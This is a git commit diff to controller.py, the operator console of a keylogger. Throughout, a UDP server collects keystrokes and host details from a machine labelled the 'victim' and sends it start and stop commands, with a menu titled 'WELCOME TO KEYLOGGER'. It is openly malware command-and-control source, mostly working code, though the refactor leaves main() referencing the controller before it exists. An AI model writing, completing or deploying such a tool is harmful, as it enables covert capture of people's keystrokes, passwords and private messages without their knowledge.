e868df465e638287be5a190e38a85845c30426e2
kira <ignat.skochilov@gmail.com>
2025-10-20 00:45:46 +0300

    iface3

--- controller.py
+++ controller.py
@@ -12,11 +12,9 @@ import socket, os
 import json
 import threading
 from typing import Optional
-import time
-# import keyboard
 from pynput.keyboard import Listener, Key
 
-line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
 banner = """
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
@@ -45,85 +43,8 @@ banner = """
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀         ┃
 ┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃"""
 
-class ControllerServer:
-    def __init__(self, ip_victim: Optional[str] = None, port_listen: int = 9999, port_send: int = 9998):
-        self.ip_victim = ip_victim
-        self.port_listen = port_listen
-        self.port_send = port_send
-        self.buffer = ""
-        self.info_victim = ""
-
-    def send_command(self, message: str, timeout: float = 2.0):
-
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            sock.settimeout(timeout)
-            try:
-                request = {
-                    "command": message
-                }
-                sent = sock.sendto(json.dumps(request).encode(), (self.ip_victim, self.port_send))
-                print(f"Đã gửi {sent} bytes tới {self.ip_victim}:{self.port_send}")
-            except socket.timeout:
-                pass
-            except Exception as e:
-                pass
-
-    def listen_clients(self, buffer_size: int = 8192):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(('0.0.0.0', self.port_listen))
-        sock.settimeout(1)
-        #print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
-
-        try:
-            while True:
-                try:
-                    data, _ = sock.recvfrom(buffer_size)
-                    data = json.loads(data.decode())
-                    data_str = data.get("message", "")
-                    signal = data.get("signal", False)
-                    ip_victim = data.get("from_ip", None)
-
-                    if (self.ip_victim is None
-                            or self.ip_victim != ip_victim
-                            or self.info_victim == data_str):
-                        self.ip_victim = ip_victim
-                        self.send_command(message="Server_active")
-                        self.info_victim = data_str
-                        continue
-
-                    if signal:
-                        self.buffer += data_str
-                        menu.clear_screen()
-                        menu.draw_menu()
-                        # os.system('clear')
-                        # print("\033[32m" + banner + "\033[0m")
-                        # print(self.info_victim)
-                        # print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
-                        # print("Keystroke operation ->", self.buffer)
-                        # print("Enter 'stop' to stop, 'exit' to quit... ->")
-                    else:
-                        # os.system('clear')
-                        # print("\033[32m" + banner + "\033[0m")
-                        self.buffer = ""
-                        # print("Stopped. Enter 'start' to restart monitoring, 'exit' to quit... ->")
-                except socket.timeout as e:
-                    continue
-                except json.JSONDecodeError as e:
-                    pass
-                except OSError as e:
-                    print("Socket error:", e)
-                    break
-        except KeyboardInterrupt:
-            print("\nReceived Ctrl+C — shutting down server gracefully.")
-        finally:
-            sock.close()
-            print("Socket closed. Bye.")
-
-
-
 class ConsoleMenu:
-    def __init__(self):
+    def __init__(self, ip_victim: Optional[str] = None, port_send: int = 9998):
         self.appname = "★彡━━━━━★ W E L C O M E  T O  K E Y L O G G E R ★━━━━━彡★"
         self.pause_continue = {"Pause": "Pause", "Continue": "Continue"}
         self.options = [
@@ -131,14 +52,16 @@ class ConsoleMenu:
             f"{self.pause_continue['Pause']}", # Continue
             "Exit"
         ]
-        self.controller = None
         self.current_selection = 0
         self.running = True
+        self.ip_victim = ip_victim
+        self.port_send = port_send
+
 
     def clear_screen(self):
         os.system('cls' if os.name == 'nt' else 'clear')
 
-    def draw_menu(self):
+    def draw_menu(self, info_victim, buffer):
         menu_width = len(self.appname) + 6
 
         print()
@@ -159,26 +82,43 @@ class ConsoleMenu:
         print("┃" + " " * padding + footer + " " * padding + " ┃")
         print("┗" + "━" * menu_width + "┛")
         # print("┣" + "━" * menu_width + "┫")
-        print(controller.info_victim)
+        print(info_victim)
         # print("┗" + "━" * menu_width + "┛")
-        print("Keystroke operation ->", controller.buffer)
+        print("Keystroke operation ->", buffer)
 
+    def init_for_commands():
+        pass
 
-    def execute_selection(self):
+    def execute_selection(self, ):
         option = self.current_selection
         print(f"\nВыбранная опция: {self.options[option]}")
 
         if option == 0:
-            controller.buffer = ""
+            self.buffer = ""
         if option == 1:
             if self.options[1] == "Pause":
                 self.options[1] = f"{self.pause_continue['Continue']}"
-                controller.send_command("stop")
+                self.send_command("stop")
             else:
                 self.options[1] = f"{self.pause_continue['Pause']}"
-                controller.send_command("start")
+                self.send_command("start")
         if option == 2:
             self.running = False
+
+    def send_command(self, message: str, timeout: float = 2.0):
+
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.settimeout(timeout)
+            try:
+                request = {
+                    "command": message
+                }
+                sent = sock.sendto(json.dumps(request).encode(), (self.ip_victim, self.port_send))
+                print(f"Sent {sent} bytes to {self.ip_victim}:{self.port_send}")
+            except socket.timeout:
+                pass
+            except Exception as e:
+                pass
 
     def on_press(self, key):
         try:
@@ -206,16 +146,62 @@ class ConsoleMenu:
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
+class ControllerServer:
+    def __init__(self, ip_victim: Optional[str] = None, port_listen: int = 9999):
+        self.ip_victim = ip_victim
+        self.port_listen = port_listen
+        self.buffer = ""
+        self.info_victim = ""
+        self.menu = ConsoleMenu()
 
-controller = ControllerServer()
-menu = ConsoleMenu()
+    def listen_clients(self, buffer_size: int = 8192):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind(('0.0.0.0', self.port_listen))
+        sock.settimeout(1)
+
+        try:
+            while True:
+                try:
+                    data, _ = sock.recvfrom(buffer_size)
+                    data = json.loads(data.decode())
+                    data_str = data.get("message", "")
+                    signal = data.get("signal", False)
+                    ip_victim = data.get("from_ip", None)
+
+                    if (self.ip_victim is None
+                            or self.ip_victim != ip_victim
+                            or self.info_victim == data_str):
+                        self.ip_victim = ip_victim
+                        self.menu.send_command(message="Server_active")
+                        self.info_victim = data_str
+                        continue
+                    if signal:
+                        self.buffer += data_str
+                        self.menu.clear_screen()
+                        self.menu.draw_menu(self.info_victim, self.buffer)
+                    else:
+                        self.buffer = ""
+                except socket.timeout as e:
+                    continue
+                except json.JSONDecodeError as e:
+                    pass
+                except OSError as e:
+                    print("Socket error:", e)
+                    break
+        except KeyboardInterrupt:
+            print("\nReceived Ctrl+C — shutting down server gracefully.")
+        finally:
+            sock.close()
+            print("Socket closed. Bye.")
 
 def main():
     listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
     listener_thread.start()
-    # controller.send_command("start")
+    controller = ControllerServer()
+    
     try:
-        menu.run()
+        controller.menu.run()
     except KeyboardInterrupt:
         print("\nReceived Ctrl+C — shutting down server gracefully.")
 
